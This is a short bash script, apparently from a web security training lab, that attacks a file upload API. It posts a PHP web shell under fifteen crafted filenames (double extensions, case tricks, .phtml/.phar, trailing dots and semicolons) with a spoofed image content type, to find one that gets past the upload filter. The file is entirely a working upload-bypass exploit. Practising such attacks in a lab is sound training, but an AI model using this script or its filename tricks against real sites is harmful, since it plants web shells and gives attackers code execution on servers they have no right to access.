#!/usr/bin/env bash
cd "$(dirname "$0")" || exit 1
clear
H='Host: test-s3.web0x05.hbtn'
B='http://web0x05.hbtn'
URL="$B/api/task2/"

# liste de noms piéges (le contenu reste du PHP valide)
names=(
  "shell.php.jpg"
  "shell.jpg.php"
  "shell.php.png"
  "shell.png.php"
  "shell.pHp"
  "shell.PHP"
  "shell.phtml"
  "shell.php5"
  "shell.pht"
  "shell.phar"
  "shell.php."
  "shell.php "
  "shell .php"
  "shell.php;.jpg"
  "shell.jpg.php;"
)

for fn in "${names[@]}"; do
  resp=$(curl -s -H "$H" -F "file=@shell2.php;filename=$fn;type=image/png" "$URL")
  echo "[$fn] -> $resp"
done
